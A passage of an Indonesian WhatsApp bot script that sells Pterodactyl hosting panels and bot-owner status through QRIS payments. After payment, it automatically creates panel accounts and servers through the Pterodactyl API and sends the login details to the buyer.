Obj.cpu = "140"
Obj.harga = "6000"
} else if (cmd == "7gb") {
Obj.ram = "7000"
Obj.disk = "4000"
Obj.cpu = "160"
Obj.harga = "7000"
} else if (cmd == "8gb") {
Obj.ram = "8000"
Obj.disk = "4000"
Obj.cpu = "180"
Obj.harga = "8000"
} else if (cmd == "9gb") {
Obj.ram = "9000"
Obj.disk = "5000"
Obj.cpu = "200"
Obj.harga = "9000"
} else if (cmd == "10gb") {
Obj.ram = "10000"
Obj.disk = "5000"
Obj.cpu = "220"
Obj.harga = "10000"
} else if (cmd == "unli" || cmd == "unlimited") {
Obj.ram = "0"
Obj.disk = "0"
Obj.cpu = "0"
Obj.harga = "11000"
} else return m.reply(teks)

const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)

const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apibotnabzx}&amount=${amount}&codeqr=${UrlQr}`);

const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await dwiaff.sendMessage(m.chat, {
  footer: `© 2024 ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await dwiaff.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await dwiaff.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apibotnabzx}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await dwiaff.sendMessage(db.users[m.sender].saweria.chat, {text:`
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let username = crypto.randomBytes(4).toString('hex')
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": Obj.ram,
"swap": 0,
"disk": Obj.disk,
"io": 500,
"cpu": Obj.cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang = db.users[m.sender].saweria.chat
var tekspanel = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}
* *Ram :* ${Obj.ram == "0" ? "Unlimited" : Obj.ram.split("").length > 4 ? Obj.ram.split("").slice(0,2).join("") + "GB" : Obj.ram.charAt(0) + "GB"}
* *Cpu :* ${Obj.cpu == "0" ? "Unlimited" : Obj.cpu+"%"}
* *Disk :* ${Obj.disk == "0" ? "Unlimited" : Obj.disk.split("").length > 4 ? Obj.disk.split("").slice(0,2).join("") + "GB" : Obj.disk.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await dwiaff.sendMessage(orang, {text: tekspanel}, {quoted: null})
await dwiaff.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

case "delseller": {
if (!isCreator) return reply(mess.owner) 
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (!reseller.includes(orang)) return m.reply(`User ${orang.split('@')[0]} Tidak Terdaftar Di Database Reseller Panel!`)
let indx = reseller.indexOf(orang)
await reseller.splice(indx, 1)
await fs.writeFileSync("./database/reseller.json", JSON.stringify(reseller))
reply(`Berhasil Menghapus ${orang.split('@')[0]} Dari Database Reseller Panel`)
} else {
return m.reply(example("@tag/62838XXX"))
}}
break
    
case "delprem": {
    if (!isCreator) return reply(mess.owner)
    if (m.quoted || text) {
        let orang = m.mentionedJid[0] 
            ? m.mentionedJid[0] 
            : text 
            ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' 
            : m.quoted 
            ? m.quoted.sender 
            : '';
        if (!premium.includes(orang)) 
            return m.reply(`User ${orang.split('@')[0]} Tidak Terdaftar Sebagai Pengguna Premium!`);
        
        let indx = premium.indexOf(orang);
        await premium.splice(indx, 1);
        await fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
        m.reply(`Berhasil Menghapus ${orang.split('@')[0]} Dari Database Pengguna Premium`);
    } else {
        return m.reply(example("@tag/62838XXX"));
    }
}
break;
            
case "delowner": case "delown": {
if (!isCreator) return reply(mess.owner)

if (!m.quoted && !text) return m.reply(example("6285###"))

const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

const input2 = input.split("@")[0]

if (input2 === global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner utama!`)

if (!owners.includes(input)) return m.reply(`Nomor ${input2} bukan owner bot!`)

let posi = owners.indexOf(input)

await owners.splice(posi, 1)

await fs.writeFileSync("./database/owner.json", JSON.stringify(owners, null, 2))

m.reply(`Berhasil menghapus owner ✅`)

}

break           

case 'buyadp': {
if (!q || isNaN(q)) return m.reply('Nomor');

let text = q; // Store the input "enemy number" in the variable nomor
  let teksHeader = `
ᴘɪʟɪʜ ᴋᴇʙᴜᴛᴜʜᴀɴ ᴀɴᴅᴀ ᴅᴇɴɢᴀɴ ʙᴏᴛ ᴡʜᴀᴛsᴀᴘᴘ ʏᴀɴɢ ᴋᴇʀᴇɴ ᴅᴀɴ ʏᴀɴɢ ᴅᴀᴘᴀᴛ ᴍᴇʟᴀʏᴀɴɪ ᴘᴇᴍʙᴇʟɪ
  `;
dwiaff.sendMessage(m.chat, {
  text: teksHeader, 
  footer: "ᴄʀᴇᴀᴛᴏʀ ᴅᴡɪᴀғғ ツ",
  buttons: [
  {
    buttonId: 'action',
    buttonText: {
      displayText: 'ini pesan interactiveMeta'
    },
    type: 4,
    nativeFlowInfo: {
      name: 'single_select',
      paramsJson: JSON.stringify({
        title: 'ᴘɪʟɪʜ ʀᴀᴍ',
        sections: [
{ title: "✨️ᴘɪʟɪʜ sᴇʀᴠᴇʀ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ ✨️",  
rows: [{ title: "👑 ʙᴜʏ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ ᴘᴜʙʟɪᴄ", description: "ᴍᴇᴍʙᴇʟɪ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ ᴘᴜʙʟɪᴄ", id: `.buyadp1 ${text}` },
{ title: `👑 ʙᴜʏ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ ᴘʀɪᴠᴀᴛᴇ`, description: `ᴍᴇᴍʙᴇʟɪ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ ᴘʀɪᴠᴀᴛᴇ`, id: `.buyadp2 ${text}` },
{ title: "⚡ ᴍᴇᴍʙᴇʟɪ sᴄʀɪᴘᴛ", description: "ᴍᴇᴍʙᴇʟɪ sᴄʀɪᴘᴛ", id: ".buyscript" }, 
]}],
})},
}],
headerType: 1,
viewOnce: true
}, { quoted: qloc });
}
break;

case 'buyownpanel': {
if (!q || isNaN(q)) return m.reply('Nomor');

let text = q; // Store the input "enemy number" in the variable nomor
  let teksHeader = `
ᴘɪʟɪʜ ᴋᴇʙᴜᴛᴜʜᴀɴ ᴀɴᴅᴀ ᴅᴇɴɢᴀɴ ʙᴏᴛ ᴡʜᴀᴛsᴀᴘᴘ ʏᴀɴɢ ᴋᴇʀᴇɴ ᴅᴀɴ ʏᴀɴɢ ᴅᴀᴘᴀᴛ ᴍᴇʟᴀʏᴀɴɪ ᴘᴇᴍʙᴇʟɪ
  `;
dwiaff.sendMessage(m.chat, {
  text: teksHeader, 
  footer: "ᴄʀᴇᴀᴛᴏʀ ᴅᴡɪᴀғғ ツ",
  buttons: [
  {
    buttonId: 'action',
    buttonText: {
      displayText: 'ini pesan interactiveMeta'
    },
    type: 4,
    nativeFlowInfo: {
      name: 'single_select',
      paramsJson: JSON.stringify({
        title: 'ᴘɪʟɪʜ sᴇʀᴠᴇʀ',
        sections: [
{ title: "✨️ᴘɪʟɪʜ sᴇʀᴠᴇʀ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ ✨️",  
rows: [{ title: "👑 ʙᴜʏ ᴏᴡɴ ᴘᴀɴᴇʟ ᴘᴜʙʟɪᴄ", description: "ᴍᴇᴍʙᴇʟɪ ᴏᴡɴ ᴘᴀɴᴇʟ ᴘᴜʙʟɪᴄ", id: `.buyownpanel1 ${text}` },
{ title: `👑 ʙᴜʏ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ ᴘʀɪᴠᴀᴛᴇ`, description: `ᴍᴇᴍʙᴇʟɪ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ ᴘʀɪᴠᴀᴛᴇ`, id: `.buyownpanel2 ${text}` },
{ title: "⚡ ᴍᴇᴍʙᴇʟɪ sᴄʀɪᴘᴛ", description: "ᴍᴇᴍʙᴇʟɪ sᴄʀɪᴘᴛ", id: ".buyscript" }, 
]}],
})},
}],
headerType: 1,
viewOnce: true
}, { quoted: qloc });
}
break;

case "buyadp1": {
    if (!isCreator) return reply(mess.owner)
    if (m.quoted || text) {
        let orang = m.mentionedJid[0] 
            ? m.mentionedJid[0] 
            : text 
                ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' 
                : m.quoted 
                    ? m.quoted.sender 
                    : '';
        
        if (owners.includes(orang)) return m.reply(`⚠️ *User ${orang.split('@')[0]} sudah terdaftar di database owner bot!*`);
        
        const amount = 10000; // Biaya untuk menjadi owner
        const UrlQr = global.qrisOrderKuota;

        // Buat QRIS pembayaran
        const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apibotnabzx}&amount=${amount}&codeqr=${UrlQr}`);
        const teksPembayaran = `
━━━━━━━━━━━━━━━━━━━━━━━
      🌟 *𝘽𝙀𝘾𝙊𝙈𝙀 𝙊𝙒𝙉𝙀𝙍* 🌟
━━━━━━━━━━━━━━━━━━━━━━━

📌 *• ID Transaksi :* ${get.data.result.transactionId}
📌 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
📌 *• Metode :* QRIS
📌 *• Expired :* 5 menit

📝 *Catatan:*
⚠️ QRIS pembayaran hanya berlaku selama *5 menit*.  
✅ Setelah pembayaran berhasil, Anda akan otomatis menjadi *Owner Bot*.

🔻 Ketik *.batalbeli* untuk membatalkan transaksi.
━━━━━━━━━━━━━━━━━━━━━━━
`;

        let msgQr = await dwiaff.sendMessage(m.chat, { 
            image: { url: get.data.result.qrImageUrl }, 
            caption: teksPembayaran 
        }, { quoted: m });

        db.users[m.sender].status_deposit = true;
        db.users[m.sender].addowner = {
            msg: msgQr,
            chat: m.sender,
            idDeposit: get.data.result.transactionId,
            amount: get.data.result.amount.toString(),
            target: orang, // User yang akan dijadikan owner
            exp: function () {
                setTimeout(async () => {
                    if (db.users[m.sender].status_deposit) {
                        await dwiaff.sendMessage(
                            db.users[m.sender].addowner.chat, 
                            { text: "❌ *QRIS pembayaran telah expired!*" }, 
                            { quoted: db.users[m.sender].addowner.msg }
                        );
                        await dwiaff.sendMessage(
                            db.users[m.sender].addowner.chat, 
                            { delete: db.users[m.sender].addowner.msg.key }
                        );
                        db.users[m.sender].status_deposit = false;
                        delete db.users[m.sender].addowner;
                    }
                }, 300000);
            }
        };

        await db.users[m.sender].addowner.exp();

        // Cek status pembayaran secara berkala
        while (db.users[m.sender].status_deposit) {
            await sleep(8000);
            const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apibotnabzx}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
            const req = await resultcek.data.amount;
            if (req == db.users[m.sender].addowner.amount) {
                db.users[m.sender].status_deposit = false;

                // Tambahkan pengguna sebagai owner
                await owners.push(db.users[m.sender].addowner.target);
                await fs.writeFileSync("./database/owner.json", JSON.stringify(owners));

                // Buat admin panel secara otomatis
                let randomUsername = "user" + crypto.randomBytes(4).toString('hex');
                let randomPassword = crypto.randomBytes(8).toString('hex');
                let email = randomUsername + "@gmail.com";
                let firstName = "Admin";
                let lastName = "Panel";

                let f = await fetch(domain + "/api/application/users", {
                    "method": "POST",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey
                    },
                    "body": JSON.stringify({
                        "email": email,
                        "username": randomUsername,
                        "first_name": firstName,
                        "last_name": lastName,
                        "root_admin": true,
                        "language": "en",
                        "password": randomPassword
                    })
                });

                let data = await f.json();
                if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
                let user = data.attributes;

                // Kirim notifikasi berhasil
                await dwiaff.sendMessage(
                    db.users[m.sender].addowner.chat, 
                    { text: `✅ *Pembayaran berhasil!*\n👤 User *${db.users[m.sender].addowner.target.split('@')[0]}* telah ditambahkan sebagai *Owner Bot*.\n\n🔑 *Admin Panel Dibuat:*\n\n• Username: ${user.username}\n• Password: ${randomPassword}\n• Login: ${global.domain}` }, 
                    { quoted: db.users[m.sender].addowner.msg }
                );

                m.reply(`🎉 *Selamat!*\n👤 User *${db.users[m.sender].addowner.target.split('@')[0]}* telah berhasil menjadi *Owner Bot* ✅`);
                delete db.users[m.sender].addowner;
            }
        }
    } else {
        return m.reply(`⚠️ *Cara penggunaan:* Ketik *${command} 628XXX*`);
    }
}
break;

case "buyadp2": {
    if (!isCreator) return reply(mess.owner)
    if (m.quoted || text) {
        let orang = m.mentionedJid[0] 
            ? m.mentionedJid[0] 
            : text 
                ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' 
                : m.quoted 
                    ? m.quoted.sender 
                    : '';
        
        if (owners.includes(orang)) return m.reply(`⚠️ *User ${orang.split('@')[0]} sudah terdaftar di database owner bot!*`);
        
        const amount = 15000; // Biaya untuk menjadi owner
        const UrlQr = global.qrisOrderKuota;

        // Buat QRIS pembayaran
        const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apibotnabzx}&amount=${amount}&codeqr=${UrlQr}`);
        const teksPembayaran = `
━━━━━━━━━━━━━━━━━━━━━━━
      🌟 *𝘽𝙀𝘾𝙊𝙈𝙀 𝙊𝙒𝙉𝙀𝙍* 🌟
━━━━━━━━━━━━━━━━━━━━━━━

📌 *• ID Transaksi :* ${get.data.result.transactionId}
📌 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
📌 *• Metode :* QRIS
📌 *• Expired :* 5 menit

📝 *Catatan:*
⚠️ QRIS pembayaran hanya berlaku selama *5 menit*.  
✅ Setelah pembayaran berhasil, Anda akan otomatis menjadi *Owner Bot*.

🔻 Ketik *.batalbeli* untuk membatalkan transaksi.
━━━━━━━━━━━━━━━━━━━━━━━
`;

        let msgQr = await dwiaff.sendMessage(m.chat, { 
            image: { url: get.data.result.qrImageUrl }, 
            caption: teksPembayaran 
        }, { quoted: m });

        db.users[m.sender].status_deposit = true;
        db.users[m.sender].addowner = {
            msg: msgQr,
            chat: m.sender,
            idDeposit: get.data.result.transactionId,
            amount: get.data.result.amount.toString(),
            target: orang, // User yang akan dijadikan owner
            exp: function () {
                setTimeout(async () => {
                    if (db.users[m.sender].status_deposit) {
                        await dwiaff.sendMessage(
                            db.users[m.sender].addowner.chat, 
                            { text: "❌ *QRIS pembayaran telah expired!*" }, 
                            { quoted: db.users[m.sender].addowner.msg }
                        );
                        await dwiaff.sendMessage(
                            db.users[m.sender].addowner.chat, 
                            { delete: db.users[m.sender].addowner.msg.key }
                        );
                        db.users[m.sender].status_deposit = false;
                        delete db.users[m.sender].addowner;
                    }
                }, 300000);
            }
        };

        await db.users[m.sender].addowner.exp();

        // Cek status pembayaran secara berkala
        while (db.users[m.sender].status_deposit) {
            await sleep(8000);
            const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apibotnabzx}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
            const req = await resultcek.data.amount;
            if (req == db.users[m.sender].addowner.amount) {
                db.users[m.sender].status_deposit = false;

                // Tambahkan pengguna sebagai owner
                await owners.push(db.users[m.sender].addowner.target);
                await fs.writeFileSync("./database/owner.json", JSON.stringify(owners));

                // Buat admin panel secara otomatis
                let randomUsername = "user" + crypto.randomBytes(4).toString('hex');
                let randomPassword = crypto.randomBytes(8).toString('hex');
                let email = randomUsername + "@gmail.com";
                let firstName = "Admin";
                let lastName = "Panel";

                let f = await fetch(domainV2 + "/api/application/users", {
                    "method": "POST",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikeyV2
                    },
                    "body": JSON.stringify({
                        "email": email,
                        "username": randomUsername,
                        "first_name": firstName,
                        "last_name": lastName,
                        "root_admin": true,
                        "language": "en",
                        "password": randomPassword
                    })
                });

                let data = await f.json();
                if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
                let user = data.attributes;

                // Kirim notifikasi berhasil
                await dwiaff.sendMessage(
                    db.users[m.sender].addowner.chat, 
                    { text: `✅ *Pembayaran berhasil!*\n👤 User *${db.users[m.sender].addowner.target.split('@')[0]}* telah ditambahkan sebagai *Owner Bot*.\n\n🔑 *Admin Panel Dibuat:*\n\n• Username: ${user.username}\n• Password: ${randomPassword}\n• Login: ${global.domain}` }, 
                    { quoted: db.users[m.sender].addowner.msg }
                );

                m.reply(`🎉 *Selamat!*\n👤 User *${db.users[m.sender].addowner.target.split('@')[0]}* telah berhasil menjadi *Owner Bot* ✅`);
                delete db.users[m.sender].addowner;
            }
        }
    } else {
        return m.reply(`⚠️ *Cara penggunaan:* Ketik *${command} 628XXX*`);
    }
}
break;

case "buyownpanel1": {
    if (!isCreator) return reply(mess.owner)
    if (m.quoted || text) {
        let orang = m.mentionedJid[0] 
            ? m.mentionedJid[0] 
            : text 
                ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' 
                : m.quoted 
                    ? m.quoted.sender 
                    : '';
        
        if (owners.includes(orang)) return m.reply(`⚠️ *User ${orang.split('@')[0]} sudah terdaftar di database owner bot!*`);
        
        const amount = 20000; // Biaya untuk menjadi owner
        const UrlQr = global.qrisOrderKuota;

        // Buat QRIS pembayaran
        const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apibotnabzx}&amount=${amount}&codeqr=${UrlQr}`);
        const teksPembayaran = `
━━━━━━━━━━━━━━━━━━━━━━━
      🌟 *𝘽𝙀𝘾𝙊𝙈𝙀 𝙊𝙒𝙉𝙀𝙍* 🌟
━━━━━━━━━━━━━━━━━━━━━━━

📌 *• ID Transaksi :* ${get.data.result.transactionId}
📌 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
📌 *• Metode :* QRIS
📌 *• Expired :* 5 menit

📝 *Catatan:*
⚠️ QRIS pembayaran hanya berlaku selama *5 menit*.  
✅ Setelah pembayaran berhasil, Anda akan otomatis menjadi *Owner Bot*.

🔻 Ketik *.batalbeli* untuk membatalkan transaksi.
━━━━━━━━━━━━━━━━━━━━━━━
`;

        let msgQr = await dwiaff.sendMessage(m.chat, { 
            image: { url: get.data.result.qrImageUrl }, 
            caption: teksPembayaran 
        }, { quoted: m });

        db.users[m.sender].status_deposit = true;
        db.users[m.sender].addowner = {
            msg: msgQr,
            chat: m.sender,
            idDeposit: get.data.result.transactionId,
            amount: get.data.result.amount.toString(),
            target: orang, // User yang akan dijadikan owner
            exp: function () {
                setTimeout(async () => {
                    if (db.users[m.sender].status_deposit) {
                        await dwiaff.sendMessage(
                            db.users[m.sender].addowner.chat, 
                            { text: "❌ *QRIS pembayaran telah expired!*" }, 
                            { quoted: db.users[m.sender].addowner.msg }
                        );
                        await dwiaff.sendMessage(
                            db.users[m.sender].addowner.chat, 
                            { delete: db.users[m.sender].addowner.msg.key }
                        );
                        db.users[m.sender].status_deposit = false;
                        delete db.users[m.sender].addowner;
                    }
                }, 300000);
            }
        };

        await db.users[m.sender].addowner.exp();

        // Cek status pembayaran secara berkala
        while (db.users[m.sender].status_deposit) {
            await sleep(8000);
            const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apibotnabzx}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
            const req = await resultcek.data.amount;
            if (req == db.users[m.sender].addowner.amount) {
                db.users[m.sender].status_deposit = false;

                // Tambahkan pengguna sebagai owner
                await owners.push(db.users[m.sender].addowner.target);
                await fs.writeFileSync("./database/owner.json", JSON.stringify(owners));

                // Buat admin panel secara otomatis
                let randomUsername = "user" + crypto.randomBytes(4).toString('hex');
                let randomPassword = crypto.randomBytes(8).toString('hex');
                let email = randomUsername + "@gmail.com";
                let firstName = "Admin";
                let lastName = "Panel";

                let f = await fetch(domain + "/api/application/users", {
                    "method": "POST",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey
                    },
                    "body": JSON.stringify({
                        "email": email,
                        "username": randomUsername,
                        "first_name": firstName,
                        "last_name": lastName,
                        "root_admin": true,
                        "language": "en",
                        "password": randomPassword
                    })
                });

                let data = await f.json();
                if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
                let user = data.attributes;

                // Kirim notifikasi berhasil
                await dwiaff.sendMessage(
                    db.users[m.sender].addowner.chat, 
                    { text: `✅ *Pembayaran berhasil!*\n👤 User *${db.users[m.sender].addowner.target.split('@')[0]}* telah ditambahkan sebagai *Owner Bot*.\n\n🔑 *Admin Panel Dibuat:*\n\n• Username: ${user.username}\n• Password: ${randomPassword}\n• Login: ${global.domain}` }, 
                    { quoted: db.users[m.sender].addowner.msg }
                );

                m.reply(`🎉 *Selamat!*\n👤 User *${db.users[m.sender].addowner.target.split('@')[0]}* telah berhasil menjadi *Owner Bot* ✅`);
                delete db.users[m.sender].addowner;
            }
        }
    } else {
        return m.reply(`⚠️ *Cara penggunaan:* Ketik *${command} 628XXX*`);
    }
}
break;

case "buyownpanel2": {
    if (!isCreator) return reply(mess.owner)
    if (m.quoted || text) {
        let orang = m.mentionedJid[0] 
            ? m.mentionedJid[0] 
            : text 
                ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' 
                : m.quoted 
                    ? m.quoted.sender 
                    : '';
        
        if (owners.includes(orang)) return m.reply(`⚠️ *User ${orang.split('@')[0]} sudah terdaftar di database owner bot!*`);
        
        const amount = 25000; // Biaya untuk menjadi owner
        const UrlQr = global.qrisOrderKuota;

        // Buat QRIS pembayaran
        const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apibotnabzx}&amount=${amount}&codeqr=${UrlQr}`);
        const teksPembayaran = `
━━━━━━━━━━━━━━━━━━━━━━━
      🌟 *𝘽𝙀𝘾𝙊𝙈𝙀 𝙊𝙒𝙉𝙀𝙍* 🌟
━━━━━━━━━━━━━━━━━━━━━━━

📌 *• ID Transaksi :* ${get.data.result.transactionId}
📌 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
📌 *• Metode :* QRIS
📌 *• Expired :* 5 menit

📝 *Catatan:*
⚠️ QRIS pembayaran hanya berlaku selama *5 menit*.  
✅ Setelah pembayaran berhasil, Anda akan otomatis menjadi *Owner Bot*.

🔻 Ketik *.batalbeli* untuk membatalkan transaksi.
━━━━━━━━━━━━━━━━━━━━━━━
`;

        let msgQr = await dwiaff.sendMessage(m.chat, { 
            image: { url: get.data.result.qrImageUrl }, 
            caption: teksPembayaran 
        }, { quoted: m });

        db.users[m.sender].status_deposit = true;
        db.users[m.sender].addowner = {
            msg: msgQr,
            chat: m.sender,
            idDeposit: get.data.result.transactionId,
            amount: get.data.result.amount.toString(),
            target: orang, // User yang akan dijadikan owner
            exp: function () {
                setTimeout(async () => {
                    if (db.users[m.sender].status_deposit) {
                        await dwiaff.sendMessage(
                            db.users[m.sender].addowner.chat, 
                            { text: "❌ *QRIS pembayaran telah expired!*" }, 
                            { quoted: db.users[m.sender].addowner.msg }
                        );
                        await dwiaff.sendMessage(
                            db.users[m.sender].addowner.chat, 
                            { delete: db.users[m.sender].addowner.msg.key }
                        );
                        db.users[m.sender].status_deposit = false;
                        delete db.users[m.sender].addowner;
                    }
                }, 300000);
            }
        };

        await db.users[m.sender].addowner.exp();

        // Cek status pembayaran secara berkala
        while (db.users[m.sender].status_deposit) {
            await sleep(8000);
            const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apibotnabzx}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
            const req = await resultcek.data.amount;
            if (req == db.users[m.sender].addowner.amount) {
                db.users[m.sender].status_deposit = false;

                // Tambahkan pengguna sebagai owner
                await owners.push(db.users[m.sender].addowner.target);
                await fs.writeFileSync("./database/owner.json", JSON.stringify(owners));

                // Buat admin panel secara otomatis
                let randomUsername = "user" + crypto.randomBytes(4).toString('hex');
                let randomPassword = crypto.randomBytes(8).toString('hex');
                let email = randomUsername + "@gmail.com";
                let firstName = "Admin";
                let lastName = "Panel";

                let f = await fetch(domain + "/api/application/users", {
                    "method": "POST",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey
                    },
                    "body": JSON.stringify({
                        "email": email,
                        "username": randomUsername,
                        "first_name": firstName,
                        "last_name": lastName,
                        "root_admin": true,
                        "language": "en",
                        "password": randomPassword
                    })
                });

                let data = await f.json();
                if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
                let user = data.attributes;

                // Kirim notifikasi berhasil
                await dwiaff.sendMessage(
                    db.users[m.sender].addowner.chat, 
                    { text: `✅ *Pembayaran berhasil!*\n👤 User *${db.users[m.sender].addowner.target.split('@')[0]}* telah ditambahkan sebagai *Owner Bot*.\n\n🔑 *Admin Panel Dibuat:*\n\n• Username: ${user.username}\n• Password: ${randomPassword}\n• Login: ${global.domain}` }, 
                    { quoted: db.users[m.sender].addowner.msg }
                );

                m.reply(`🎉 *Selamat!*\n👤 User *${db.users[m.sender].addowner.target.split('@')[0]}* telah berhasil menjadi *Owner Bot* ✅`);
                delete db.users[m.sender].addowner;
            }
        }
    } else {
        return m.reply(`⚠️ *Cara penggunaan:* Ketik *${command} 628XXX*`);
    }
}
break;

case "batalbeli": {
if (m.isGroup) return
if (db.users[m.sender].status_deposit == false) return 
db.users[m.sender].status_deposit = false
